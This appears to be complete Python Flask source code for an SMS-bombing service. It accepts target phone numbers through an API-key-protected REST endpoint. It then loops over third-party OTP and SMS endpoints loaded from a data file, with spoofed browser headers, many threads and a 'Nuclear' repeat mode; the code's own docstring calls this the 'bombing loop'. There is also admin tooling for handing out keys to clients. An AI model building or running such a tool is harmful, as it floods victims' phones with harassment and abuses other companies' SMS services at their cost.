"""
SMS Burst API - Pure REST API Version
Multi-instance ready | Render 500MB optimized | API Key secured
All state is stored in PostgreSQL (no in-memory state) so multiple instances work correctly.
"""

import json
import threading
import time
import os
import secrets
import hashlib
import requests
import pg8000
import pg8000.native
from urllib.parse import urlparse
from flask import Flask, request, jsonify
from functools import wraps
from datetime import datetime, timedelta
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ─── Config ───────────────────────────────────────────────────────────────────
DB_URL       = os.environ.get("DATABASE_URL")
MASTER_KEY   = os.environ.get("MASTER_API_KEY", "change-me-in-env")   # Admin API key
RATE_LIMIT   = int(os.environ.get("RATE_LIMIT_PER_MIN", 30))           # requests/min per key
MAX_THREADS  = int(os.environ.get("MAX_THREADS", 10))                  # thread cap per instance

# ─── DB connection (pg8000 — pure Python, works on any Python version) ──────
_db_params = None

def _parse_db_url():
    global _db_params
    if _db_params is not None:
        return _db_params
    if not DB_URL:
        return None
    try:
        u = urlparse(DB_URL)
        _db_params = {
            "host":     u.hostname,
            "port":     u.port or 5432,
            "database": u.path.lstrip("/"),
            "user":     u.username,
            "password": u.password,
            "ssl_context": True,   # Supabase requires SSL
        }
        return _db_params
    except Exception as e:
        logging.error(f"DB URL parse error: {e}")
        return None

def get_db():
    params = _parse_db_url()
    if not params:
        return None
    try:
        conn = pg8000.connect(**params)
        conn.autocommit = False
        return conn
    except Exception as e:
        logging.error(f"DB connect error: {e}")
        return None

def release_db(conn):
    try:
        conn.close()
    except Exception:
        pass

# ─── DB Init ──────────────────────────────────────────────────────────────────
def init_db():
    if not DB_URL:
        logging.warning("DATABASE_URL not set — DB features disabled")
        return
    conn = get_db()
    if not conn:
        return
    try:
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS api_keys (
                id          SERIAL PRIMARY KEY,
                key_hash    TEXT UNIQUE NOT NULL,
                label       TEXT,
                role        TEXT DEFAULT 'user',   -- 'admin' | 'user'
                rate_limit  INTEGER DEFAULT 30,
                created_at  TIMESTAMP DEFAULT NOW(),
                last_used   TIMESTAMP,
                is_active   BOOLEAN DEFAULT TRUE
            )
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS blacklist (
                id       SERIAL PRIMARY KEY,
                phone    TEXT UNIQUE,
                added_at TIMESTAMP DEFAULT NOW()
            )
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS jobs (
                id          SERIAL PRIMARY KEY,
                job_id      TEXT UNIQUE,
                api_key_id  INTEGER REFERENCES api_keys(id),
                targets     TEXT,          -- comma-separated phones
                mode        TEXT,
                delay       FLOAT DEFAULT 0.4,
                max_requests INTEGER DEFAULT 100,
                sent_count  INTEGER DEFAULT 0,
                status      TEXT DEFAULT 'running',  -- running | stopped | done
                logs        TEXT DEFAULT '[]',
                started_at  TIMESTAMP DEFAULT NOW(),
                updated_at  TIMESTAMP DEFAULT NOW()
            )
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS rate_log (
                id         SERIAL PRIMARY KEY,
                key_hash   TEXT,
                hit_at     TIMESTAMP DEFAULT NOW()
            )
        """)
        # Create index for fast rate limit queries
        cur.execute("CREATE INDEX IF NOT EXISTS idx_rate_log_key_time ON rate_log(key_hash, hit_at)")
        cur.execute("CREATE INDEX IF NOT EXISTS idx_jobs_job_id ON jobs(job_id)")
        conn.commit()
        cur.close()
        logging.info("DB initialized OK")

        # Auto-create admin key if none exist
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM api_keys")
        if cur.fetchone()[0] == 0:
            raw_key = MASTER_KEY
            h = hashlib.sha256(raw_key.encode()).hexdigest()
            cur.execute(
                "INSERT INTO api_keys (key_hash, label, role, rate_limit) VALUES (%s, %s, %s, %s) ON CONFLICT DO NOTHING",
                (h, "master-admin", "admin", 999)
            )
            conn.commit()
            logging.info(f"Master admin key created — use MASTER_API_KEY env var to set it")
        cur.close()
    except Exception as e:
        logging.error(f"DB init error: {e}")
    finally:
        release_db(conn)

init_db()

# ─── Auth & Rate Limiting ─────────────────────────────────────────────────────
def hash_key(raw: str) -> str:
    return hashlib.sha256(raw.strip().encode()).hexdigest()

def get_key_info(raw_key: str):
    """Returns (key_id, role, rate_limit) or None"""
    conn = get_db()
    if not conn:
        return None
    try:
        h = hash_key(raw_key)
        cur = conn.cursor()
        cur.execute(
            "SELECT id, role, rate_limit FROM api_keys WHERE key_hash=%s AND is_active=TRUE",
            (h,)
        )
        row = cur.fetchone()
        if row:
            # Update last_used async-style (fire and forget inside same conn)
            cur.execute("UPDATE api_keys SET last_used=NOW() WHERE key_hash=%s", (h,))
            conn.commit()
        cur.close()
        return row  # (id, role, rate_limit) or None
    except Exception as e:
        logging.error(f"Auth error: {e}")
        return None
    finally:
        release_db(conn)

def check_rate_limit(raw_key: str, limit: int) -> bool:
    """Returns True if allowed, False if rate limited"""
    conn = get_db()
    if not conn:
        return True  # fail open if DB down
    try:
        h = hash_key(raw_key)
        cur = conn.cursor()
        # Count hits in the last minute
        cur.execute(
            "SELECT COUNT(*) FROM rate_log WHERE key_hash=%s AND hit_at > NOW() - INTERVAL '1 minute'",
            (h,)
        )
        count = cur.fetchone()[0]
        if count >= limit:
            cur.close()
            return False
        # Log this hit
        cur.execute("INSERT INTO rate_log (key_hash) VALUES (%s)", (h,))
        # Cleanup old entries (keep table small — only keep last 5 mins)
        cur.execute("DELETE FROM rate_log WHERE hit_at < NOW() - INTERVAL '5 minutes'")
        conn.commit()
        cur.close()
        return True
    except Exception as e:
        logging.error(f"Rate limit error: {e}")
        return True
    finally:
        release_db(conn)

def require_api_key(role="user"):
    """Decorator: validates X-API-Key header, checks rate limit"""
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            raw_key = request.headers.get("X-API-Key", "").strip()
            if not raw_key:
                return jsonify({"error": "Missing X-API-Key header"}), 401

            # Check if it's the master key first
            if raw_key == MASTER_KEY:
                key_id, key_role, key_rate_limit = 0, "admin", 999
            else:
                info = get_key_info(raw_key)
                if not info:
                    return jsonify({"error": "Invalid or inactive API key"}), 403
                key_id, key_role, key_rate_limit = info

            # Role check
            if role == "admin" and key_role != "admin":
                return jsonify({"error": "Admin access required"}), 403

            # Rate limit
            if not check_rate_limit(raw_key, key_rate_limit):
                return jsonify({"error": "Rate limit exceeded", "limit": f"{key_rate_limit}/min"}), 429

            # Inject into request context
            request.key_id   = key_id
            request.key_role = key_role
            return f(*args, **kwargs)
        return wrapper
    return decorator

# ─── Blacklist Helper ─────────────────────────────────────────────────────────
def is_blacklisted(phone: str) -> bool:
    conn = get_db()
    if not conn:
        return False
    try:
        cur = conn.cursor()
        cur.execute("SELECT 1 FROM blacklist WHERE phone=%s", (phone,))
        res = cur.fetchone()
        cur.close()
        return res is not None
    except:
        return False
    finally:
        release_db(conn)

# ─── Job State (DB-backed, multi-instance safe) ───────────────────────────────
def update_job(job_id: str, sent_count: int, logs: list, status: str):
    conn = get_db()
    if not conn:
        return
    try:
        cur = conn.cursor()
        cur.execute(
            "UPDATE jobs SET sent_count=%s, logs=%s, status=%s, updated_at=NOW() WHERE job_id=%s",
            (sent_count, json.dumps(logs[-20:]), status, job_id)
        )
        conn.commit()
        cur.close()
    except Exception as e:
        logging.error(f"update_job error: {e}")
    finally:
        release_db(conn)

def get_job(job_id: str):
    conn = get_db()
    if not conn:
        return None
    try:
        cur = conn.cursor()
        cur.execute(
            "SELECT job_id, targets, mode, delay, max_requests, sent_count, status, logs, started_at FROM jobs WHERE job_id=%s",
            (job_id,)
        )
        row = cur.fetchone()
        cur.close()
        if not row:
            return None
        return {
            "job_id":       row[0],
            "targets":      row[1].split(","),
            "mode":         row[2],
            "delay":        row[3],
            "max_requests": row[4],
            "sent_count":   row[5],
            "status":       row[6],
            "logs":         json.loads(row[7]) if row[7] else [],
            "started_at":   row[8].isoformat() if row[8] else None,
        }
    except Exception as e:
        logging.error(f"get_job error: {e}")
        return None
    finally:
        release_db(conn)

# ─── SMS Engine ───────────────────────────────────────────────────────────────
def load_services():
    try:
        with open("apidata.json", "r") as f:
            return json.load(f).get("sms", {}).get("91", [])
    except Exception as e:
        logging.error(f"Failed to load apidata.json: {e}")
        return []

def worker(service, phone, session_obj, job_id, state_ref):
    """Fires a single SMS API call"""
    try:
        url    = service["url"]
        method = service.get("method", "POST").upper()
        p_str  = json.dumps(service.get("data", {})).replace("{target}", phone)
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        res = session_obj.request(method, url, json=json.loads(p_str), headers=headers, timeout=4)

        name = service.get("name", "API")[:10]
        if res.status_code == 403:
            state_ref["logs"].insert(0, f"🚫 {name} 403 BLOCKED")
        elif res.status_code < 300:
            state_ref["sent_count"] += 1
            state_ref["logs"].insert(0, f"✅ {name} OK [{phone[-4:]}]")
        else:
            state_ref["logs"].insert(0, f"⚠️ {name} {res.status_code}")
    except Exception as e:
        state_ref["logs"].insert(0, f"💥 {service.get('name','API')[:10]} ERR")
        logging.warning(f"Worker exception [{phone}]: {e}")

def run_job(job_id: str, targets: list, mode: str, delay: float, max_requests: int):
    """Main bombing loop — runs in a daemon thread"""
    services = load_services()
    if not services:
        update_job(job_id, 0, ["❌ No services in apidata.json"], "done")
        return

    # Local state (fast writes, periodically flushed to DB)
    state = {"sent_count": 0, "logs": [], "is_running": True}
    last_flush = time.time()
    semaphore  = threading.Semaphore(MAX_THREADS)

    def check_should_stop():
        """Check DB if job was stopped from another instance"""
        conn = get_db()
        if not conn:
            return False
        try:
            cur = conn.cursor()
            cur.execute("SELECT status FROM jobs WHERE job_id=%s", (job_id,))
            row = cur.fetchone()
            cur.close()
            return row and row[0] == "stopped"
        except:
            return False
        finally:
            release_db(conn)

    with requests.Session() as s:
        while state["is_running"]:
            for phone_raw in targets:
                if not state["is_running"]:
                    break

                phone = phone_raw.strip()[-10:]
                if len(phone) < 10:
                    state["logs"].insert(0, f"⚠️ INVALID: {phone_raw[:15]}")
                    continue

                if is_blacklisted(phone):
                    state["logs"].insert(0, f"🚫 BLACKLISTED: {phone[-4:]}")
                    continue

                for svc in services:
                    if not state["is_running"]:
                        break
                    if state["sent_count"] >= max_requests:
                        state["is_running"] = False
                        break

                    semaphore.acquire()
                    def _run(s_=svc, p_=phone):
                        try:
                            worker(s_, p_, s, job_id, state)
                        finally:
                            semaphore.release()
                    threading.Thread(target=_run, daemon=True).start()
                    time.sleep(delay)

                    # Flush state to DB every 3 seconds
                    if time.time() - last_flush > 3:
                        update_job(job_id, state["sent_count"], state["logs"], "running")
                        last_flush = time.time()

                    # Check if stopped from another instance every 10 seconds
                    if time.time() % 10 < delay + 0.1:
                        if check_should_stop():
                            state["is_running"] = False
                            break

            # Single-burst mode (non-looping modes stop after one pass)
            if mode in ("Normal", "Ghost"):
                break

    update_job(job_id, state["sent_count"], state["logs"], "done")
    logging.info(f"Job {job_id} done. Sent: {state['sent_count']}")

# ═══════════════════════════════════════════════════════════════════════════════
#  API ROUTES
# ═══════════════════════════════════════════════════════════════════════════════

# ─── Health ───────────────────────────────────────────────────────────────────
@app.route("/health")
def health():
    return jsonify({"status": "ok", "ts": datetime.utcnow().isoformat()})

# ─── Start a Job ──────────────────────────────────────────────────────────────
@app.route("/api/job/start", methods=["POST"])
@require_api_key(role="user")
def start_job():
    """
    POST /api/job/start
    Headers: X-API-Key: <your-key>
    Body (JSON):
    {
        "targets": ["9876543210", "9123456789"],   // list OR comma string
        "mode": "Normal",                           // Normal | Ghost | Nuclear
        "delay": 0.4,                               // seconds between requests
        "max_requests": 100
    }
    """
    body = request.get_json(force=True, silent=True) or {}

    # Parse targets — accept list or comma string
    raw_targets = body.get("targets", [])
    if isinstance(raw_targets, str):
        targets = [t.strip() for t in raw_targets.split(",") if t.strip()]
    else:
        targets = [str(t).strip() for t in raw_targets if str(t).strip()]

    if not targets:
        return jsonify({"error": "targets required"}), 400

    mode         = body.get("mode", "Normal")
    delay        = float(body.get("delay", 0.4))
    max_requests = int(body.get("max_requests", 100))

    # Clamp delay to prevent abuse
    delay = max(0.1, min(delay, 60.0))
    max_requests = max(1, min(max_requests, 1000))

    job_id = secrets.token_hex(8)

    # Persist job in DB
    conn = get_db()
    if not conn:
        return jsonify({"error": "DB unavailable"}), 503
    try:
        cur = conn.cursor()
        cur.execute(
            """INSERT INTO jobs (job_id, api_key_id, targets, mode, delay, max_requests, status)
               VALUES (%s, %s, %s, %s, %s, %s, 'running')""",
            (job_id, request.key_id, ",".join(targets), mode, delay, max_requests)
        )
        conn.commit()
        cur.close()
    except Exception as e:
        logging.error(f"Job insert error: {e}")
        return jsonify({"error": "Failed to create job"}), 500
    finally:
        release_db(conn)

    # Kick off in background thread
    threading.Thread(
        target=run_job,
        args=(job_id, targets, mode, delay, max_requests),
        daemon=True
    ).start()

    return jsonify({
        "job_id": job_id,
        "status": "running",
        "targets": len(targets),
        "mode": mode,
        "delay": delay,
        "max_requests": max_requests
    }), 202

# ─── Job Status ───────────────────────────────────────────────────────────────
@app.route("/api/job/<job_id>", methods=["GET"])
@require_api_key(role="user")
def job_status(job_id):
    """GET /api/job/<job_id>  →  current status, sent count, logs"""
    job = get_job(job_id)
    if not job:
        return jsonify({"error": "Job not found"}), 404
    return jsonify(job)

# ─── Stop a Job ───────────────────────────────────────────────────────────────
@app.route("/api/job/<job_id>/stop", methods=["POST"])
@require_api_key(role="user")
def stop_job(job_id):
    """POST /api/job/<job_id>/stop  →  signals the job loop to stop"""
    conn = get_db()
    if not conn:
        return jsonify({"error": "DB unavailable"}), 503
    try:
        cur = conn.cursor()
        cur.execute("UPDATE jobs SET status='stopped' WHERE job_id=%s", (job_id,))
        conn.commit()
        cur.close()
    finally:
        release_db(conn)
    return jsonify({"job_id": job_id, "status": "stopped"})

# ─── List My Jobs ─────────────────────────────────────────────────────────────
@app.route("/api/jobs", methods=["GET"])
@require_api_key(role="user")
def list_jobs():
    """GET /api/jobs  →  last 20 jobs for the calling API key"""
    conn = get_db()
    if not conn:
        return jsonify({"error": "DB unavailable"}), 503
    try:
        cur = conn.cursor()
        cur.execute(
            """SELECT job_id, mode, sent_count, max_requests, status, started_at
               FROM jobs WHERE api_key_id=%s ORDER BY started_at DESC LIMIT 20""",
            (request.key_id,)
        )
        rows = cur.fetchall()
        cur.close()
    finally:
        release_db(conn)

    return jsonify([{
        "job_id":       r[0],
        "mode":         r[1],
        "sent_count":   r[2],
        "max_requests": r[3],
        "status":       r[4],
        "started_at":   r[5].isoformat() if r[5] else None
    } for r in rows])

# ═══════════════════════════════════════════════════════════════════════════════
#  ADMIN ROUTES
# ═══════════════════════════════════════════════════════════════════════════════

# ─── Create API Key ───────────────────────────────────────────────────────────
@app.route("/admin/keys/create", methods=["POST"])
@require_api_key(role="admin")
def create_key():
    """
    POST /admin/keys/create
    Body: { "label": "client-1", "role": "user", "rate_limit": 30 }
    Returns: { "api_key": "<raw-key>", ... }   ← show ONCE, not stored raw
    """
    body       = request.get_json(force=True, silent=True) or {}
    raw_key    = secrets.token_urlsafe(32)
    key_hash   = hash_key(raw_key)
    label      = body.get("label", "unnamed")
    role       = body.get("role", "user")
    rate_limit = int(body.get("rate_limit", RATE_LIMIT))

    conn = get_db()
    if not conn:
        return jsonify({"error": "DB unavailable"}), 503
    try:
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO api_keys (key_hash, label, role, rate_limit) VALUES (%s,%s,%s,%s) RETURNING id",
            (key_hash, label, role, rate_limit)
        )
        key_id = cur.fetchone()[0]
        conn.commit()
        cur.close()
    finally:
        release_db(conn)

    return jsonify({
        "id":         key_id,
        "api_key":    raw_key,          # ← Show ONCE. Store it securely!
        "label":      label,
        "role":       role,
        "rate_limit": rate_limit,
        "warning":    "Save this key — it will never be shown again!"
    }), 201

# ─── List Keys ────────────────────────────────────────────────────────────────
@app.route("/admin/keys", methods=["GET"])
@require_api_key(role="admin")
def list_keys():
    conn = get_db()
    if not conn:
        return jsonify({"error": "DB unavailable"}), 503
    try:
        cur = conn.cursor()
        cur.execute("SELECT id, label, role, rate_limit, is_active, created_at, last_used FROM api_keys ORDER BY id")
        rows = cur.fetchall()
        cur.close()
    finally:
        release_db(conn)

    return jsonify([{
        "id":         r[0],
        "label":      r[1],
        "role":       r[2],
        "rate_limit": r[3],
        "is_active":  r[4],
        "created_at": r[5].isoformat() if r[5] else None,
        "last_used":  r[6].isoformat() if r[6] else None,
    } for r in rows])

# ─── Revoke Key ───────────────────────────────────────────────────────────────
@app.route("/admin/keys/<int:key_id>/revoke", methods=["POST"])
@require_api_key(role="admin")
def revoke_key(key_id):
    conn = get_db()
    if not conn:
        return jsonify({"error": "DB unavailable"}), 503
    try:
        cur = conn.cursor()
        cur.execute("UPDATE api_keys SET is_active=FALSE WHERE id=%s", (key_id,))
        conn.commit()
        cur.close()
    finally:
        release_db(conn)
    return jsonify({"id": key_id, "is_active": False})

# ─── Blacklist ─────────────────────────────────────────────────────────────────
@app.route("/admin/blacklist", methods=["GET"])
@require_api_key(role="admin")
def list_blacklist():
    conn = get_db()
    if not conn:
        return jsonify({"error": "DB unavailable"}), 503
    try:
        cur = conn.cursor()
        cur.execute("SELECT phone, added_at FROM blacklist ORDER BY id DESC")
        rows = cur.fetchall()
        cur.close()
    finally:
        release_db(conn)
    return jsonify([{"phone": r[0], "added_at": r[1].isoformat()} for r in rows])

@app.route("/admin/blacklist", methods=["POST"])
@require_api_key(role="admin")
def add_blacklist():
    body  = request.get_json(force=True, silent=True) or {}
    phone = str(body.get("phone", "")).strip()[-10:]
    if len(phone) < 10:
        return jsonify({"error": "Invalid phone number"}), 400
    conn = get_db()
    if not conn:
        return jsonify({"error": "DB unavailable"}), 503
    try:
        cur = conn.cursor()
        cur.execute("INSERT INTO blacklist (phone) VALUES (%s) ON CONFLICT DO NOTHING", (phone,))
        conn.commit()
        cur.close()
    finally:
        release_db(conn)
    return jsonify({"phone": phone, "status": "blacklisted"}), 201

@app.route("/admin/blacklist/<phone>", methods=["DELETE"])
@require_api_key(role="admin")
def del_blacklist(phone):
    conn = get_db()
    if not conn:
        return jsonify({"error": "DB unavailable"}), 503
    try:
        cur = conn.cursor()
        cur.execute("DELETE FROM blacklist WHERE phone=%s", (phone,))
        conn.commit()
        cur.close()
    finally:
        release_db(conn)
    return jsonify({"phone": phone, "status": "removed"})

# ─── All Jobs (admin view) ────────────────────────────────────────────────────
@app.route("/admin/jobs", methods=["GET"])
@require_api_key(role="admin")
def admin_jobs():
    conn = get_db()
    if not conn:
        return jsonify({"error": "DB unavailable"}), 503
    try:
        cur = conn.cursor()
        cur.execute(
            """SELECT j.job_id, k.label, j.mode, j.sent_count, j.max_requests, j.status, j.started_at
               FROM jobs j LEFT JOIN api_keys k ON k.id=j.api_key_id
               ORDER BY j.started_at DESC LIMIT 50"""
        )
        rows = cur.fetchall()
        cur.close()
    finally:
        release_db(conn)

    return jsonify([{
        "job_id":       r[0],
        "key_label":    r[1],
        "mode":         r[2],
        "sent_count":   r[3],
        "max_requests": r[4],
        "status":       r[5],
        "started_at":   r[6].isoformat() if r[6] else None
    } for r in rows])

# ─── Run ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)), threaded=True)
